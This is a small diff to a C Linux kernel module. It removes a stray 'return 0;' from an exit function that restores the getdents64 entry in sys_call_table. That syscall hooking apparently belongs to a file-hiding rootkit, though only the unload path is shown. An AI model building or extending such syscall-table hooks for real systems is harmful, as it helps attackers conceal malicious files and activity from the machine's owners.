@@ -77,7 +77,6 @@ int f_init(void) {
 void f_exit(void) {
   sys_call_table[__NR_getdents64] = getdents64_original;
   set_page_rw(sys_call_table, 0);
-  return 0;
 }
 
 MODULE_LICENSE("GPL");
